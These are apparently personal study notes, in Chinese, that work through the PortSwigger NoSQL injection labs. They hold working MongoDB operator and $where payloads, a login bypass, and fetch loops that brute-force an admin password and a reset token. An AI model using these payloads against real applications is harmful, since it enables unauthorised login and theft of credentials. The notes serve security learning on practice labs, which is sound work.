---
title: NoSQL injection
description: NoSQL injection
last_update:
  date: "2025-10-20T08:00:00+08:00"
---

## Lab: Detecting NoSQL injection

| Dimension | Description                                                                        |
| --------- | ---------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/nosql-injection#nosql-syntax-injection        |
| Lab       | https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection |

1. `Gifts'` => `?category=Gifts%27`

```
Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: unterminated string literal : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 ' on server 127.0.0.1:27017. The full response is {"ok": 0.0, "errmsg": "SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n", "code": 139, "codeName": "JSInterpreterFailure"}
```

2. `Gifts''` => `?category=Gifts%27%27`

```
Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: missing ; before statement : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 ' on server 127.0.0.1:27017. The full response is {"ok": 0.0, "errmsg": "SyntaxError: missing ; before statement :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n", "code": 139, "codeName": "JSInterpreterFailure"}
```

3. `Gifts' || '1' = '1` => `Gifts%27%20||%20%271%27%20=%20%271`

```
Command failed with error 139 (JSInterpreterFailure): 'ReferenceError: invalid assignment left-hand side : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 ' on server 127.0.0.1:27017. The full response is {"ok": 0.0, "errmsg": "ReferenceError: invalid assignment left-hand side :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n", "code": 139, "codeName": "JSInterpreterFailure"}
```

4. `Gifts'||'1'=='1` => `?category=Gifts%27||%271%27==%271`

成功解題，這跟 SQLi 的 `' OR '1' = '1` 概念一樣，只是語法不一樣

## MongoDB 註解

假設有以下 MongoDB 查詢語法

```js
this.category == "fizzy" && this.released == 1;
```

可構造

```
?category=fizzy'%00
```

就會變成

```js
this.category == 'fizzy'\u0000' && this.released == 1
```

## NoSQL operator injection

https://portswigger.net/web-security/nosql-injection#nosql-operator-injection

- $where - Matches documents that satisfy a JavaScript expression.
- $ne - Matches all values that are not equal to a specified value.
- $in - Matches all of the values specified in an array.
- $regex - Selects documents where values match a specified regular expression.

假設有以下查詢

```js
{"username":"wiener","password":"peter"}
```

嘗試注入

```js
{"username":{"$ne":"invalid"},"password":"peter"}
```

Bypass Authentication

```js
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

查詢 admin

```js
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

## Lab: Exploiting NoSQL operator injection to bypass authentication

| Dimension | Description                                                                                    |
| --------- | ---------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/nosql-injection#detecting-operator-injection-in-mongodb   |
| Lab       | https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication |

嘗試以下，成功登入 `wiener:peter`

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({ username: { $ne: "invalid" }, password: "peter" }),
  method: "POST",
  credentials: "include",
});
```

嘗試以下

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: { $ne: "wiener" },
    password: { $ne: "wiener" },
  }),
  method: "POST",
  credentials: "include",
});
```

回傳

```html
<h4>Internal Server Error</h4>
<p class="is-warning">Query returned unexpected number of records</p>
```

嘗試以下，成功登入 `wiener:peter`

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({ username: "wiener", password: { $ne: "" } }),
  method: "POST",
  credentials: "include",
});
```

參考 [MongoDB Regex](https://www.mongodb.com/docs/manual/reference/operator/query/regex/) 語法，嘗試

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: { $regex: "admin.*" },
    password: { $ne: "" },
  }),
  method: "POST",
  credentials: "include",
});
```

成功登入 `adminvqvp4ss7`

## Exploiting syntax injection to extract data

根據 [MongoDB 官方文件 Server-side JavaScript](https://www.mongodb.com/docs/manual/core/server-side-javascript/) 的介紹，假設有以下查詢

```js
{"$where":"this.username == 'admin'"}
```

可以嘗試注入

```js
admin' && this.password[0] == 'a' || 'a'=='b
```

## Lab: Exploiting NoSQL injection to extract data

| Dimension | Description                                                                                      |
| --------- | ------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/nosql-injection#exploiting-syntax-injection-to-extract-data |
| Lab       | https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data            |

嘗試注入 truthy statement，成功取得 wiener 的使用者資訊

```js
fetch(
  `${location.origin}/user/lookup?user=${encodeURIComponent(`wiener' && '1' === '1`)}`,
);
```

確認 admin 的使用者名稱是 `administrator`

```js
fetch(
  `${location.origin}/user/lookup?user=${encodeURIComponent(`administrator' && '1' === '1`)}`,
);
```

回傳

```json
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

這題其實就是 Boolean Based NoSQL Injection，確認 password 長度 = 8

```js
fetch(
  `${location.origin}/user/lookup?user=${encodeURIComponent(`administrator' && this.password.length === 8 && '1' === '1`)}`,
);
```

寫一個迴圈來爆破密碼

```js
const letters = Array(26)
  .fill(0)
  .map((zero, idx) => String.fromCharCode(97 + idx));
async function main() {
  for (let i = 0; i < 8; i++) {
    for (const letter of letters) {
      const res = await fetch(
        `${location.origin}/user/lookup?user=${encodeURIComponent(`administrator' && this.password[${i}] === '${letter}' && '1' === '1`)}`,
      );
      const json = await res.json();
      const isTruthy = Boolean(json.username);
      if (isTruthy) {
        console.log(i, letter);
        break;
      }
    }
  }
  console.log("ok");
}
```

成功通關～

## Identifying field names

https://portswigger.net/web-security/nosql-injection#identifying-field-names

假設有以下查詢語法

```js
{"$where":`this.username == '${username}'`}
```

可以注入以下 payloads

```js
admin' && this.password != '
admin' && this.username != '
admin' && this.foo != '
```

## Injecting operators in MongoDB

https://portswigger.net/web-security/nosql-injection#injecting-operators-in-mongodb

假設有以下查詢語法

```js
{"username":"wiener","password":"peter"}
```

嘗試注入

```js
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```

比較是否有差異

## Extracting field names

https://portswigger.net/web-security/nosql-injection#extracting-field-names

承上，假設可以注入 $where，則可以 By Character 提取欄位資料

```js
"$where":"Object.keys(this).length === 8"
"$where":"Object.keys(this)[0].length === 8"
"$where":"Object.keys(this)[0][0] === 'a'"
```

## Lab: Exploiting NoSQL operator injection to extract unknown fields

| Dimension | Description                                                                                     |
| --------- | ----------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/nosql-injection#extracting-field-names                     |
| Lab       | https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields |

前面卡在不知道登入功能要怎麼 exploit NoSQLi，後來參考答案，原來會用到前面的知識

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "carlos",
    password: { $ne: "invalid" },
  }),
  method: "POST",
  credentials: "include",
});
```

回傳

```
Account locked: please reset your password
```

換成 wiener，雖然這題沒有給預設的登入帳密，但還是成功登入了

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "wiener",
    password: { $ne: "invalid" },
  }),
  method: "POST",
  credentials: "include",
});
```

但這不是重點，這題應該是要用 $where 來探測 passwordResetToken 的欄位名稱，嘗試 $where 能否注入

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "carlos",
    password: { $ne: "invalid" },
    $where: "0",
  }),
  method: "POST",
  credentials: "include",
});
```

確認 0,1 會有不同的回應，接下來就是 Boolean Based NoSQLi 的戰場了

確認 this 有五個欄位

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "carlos",
    password: { $ne: "invalid" },
    $where: "Object.keys(this).length === 5",
  }),
  method: "POST",
  credentials: "include",
});
```

確認有 username, password, email 這三個欄位

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "carlos",
    password: { $ne: "invalid" },
    $where: "Object.keys(this).includes('password')",
  }),
  method: "POST",
  credentials: "include",
});
```

確認以上三個欄位的排序，都不是在第 0 位

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "carlos",
    password: { $ne: "invalid" },
    $where: "Object.keys(this)[0] === 'password'",
  }),
  method: "POST",
  credentials: "include",
});
```

確認第 0 位的欄位長度 = 3

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "carlos",
    password: { $ne: "invalid" },
    $where: "Object.keys(this)[0].length === 3",
  }),
  method: "POST",
  credentials: "include",
});
```

確認欄位的排序是

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "carlos",
    password: { $ne: "invalid" },
    $where: "Object.keys(this)[1] === 'username'",
  }),
  method: "POST",
  credentials: "include",
});

Object.keys(this); // ['_id', 'username', 'password', 'email', '1234567890123']
```

爆破欄位名稱

```js
async function main() {
  for (let i = 0; i < 13; i++) {
    for (const letter of letters) {
      const res = await fetch(`${location.origin}/login`, {
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify({
          username: "carlos",
          password: { $ne: "invalid" },
          $where: `Object.keys(this)[4][${i}] === '${letter}'`,
        }),
        method: "POST",
        credentials: "include",
      });
      const text = await res.text();
      const isTruthy = text.includes(
        "Account locked: please reset your password",
      );
      if (isTruthy) {
        console.log(i, letter);
        break;
      }
    }
  }
  console.log("ok");
}
```

得知結果是

```js
["_id", "username", "password", "email", "passwordReset"];
```

這個我也猜得到，根本不用爆破@@

接著確定 passwordReset 的長度 = 16

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    username: "carlos",
    password: { $ne: "invalid" },
    $where: "this.passwordReset.length === 16",
  }),
  method: "POST",
  credentials: "include",
});
```

爆破 passwordReset

```js
async function main() {
  const result = [];
  for (let i = 0; i < 16; i++) {
    for (const letter of letters) {
      const res = await fetch(`${location.origin}/login`, {
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify({
          username: "carlos",
          password: { $ne: "invalid" },
          $where: `this.passwordReset[${i}] === '${letter}'`,
        }),
        method: "POST",
        credentials: "include",
      });
      const text = await res.text();
      const isTruthy = text.includes(
        "Account locked: please reset your password",
      );
      if (isTruthy) {
        result.push(letter);
        console.log(i, letter);
        break;
      }
    }
  }
  console.log("ok", result, result.join(""));
}
```

訪問 `/forgot-password?passwordReset=6c8f141b7a877397`，重設密碼即可通關

## Exfiltrating data using operators

https://portswigger.net/web-security/nosql-injection#exfiltrating-data-using-operators

假設有以下查詢語法

```js
{"username":"myuser","password":"mypass"}
```

我們可以測試以下兩個查詢語法的結果是否不一樣

```js
{"username":"admin","password":"invalid"}
{"username":"admin","password":{"$regex":"^.*"}}
```

如果不一樣的話，就可以 By Character 提取資料

```js
{"username":"admin","password":{"$regex":"^a*"}}
```

## 小結

我覺得有點可惜，這系列的 Labs 只有四題，跟 [SQL Injection](./sql-injection.md) 差很多，感覺好像剛學到一個新東西就結束了QQ

## 參考資料

- https://portswigger.net/web-security/nosql-injection
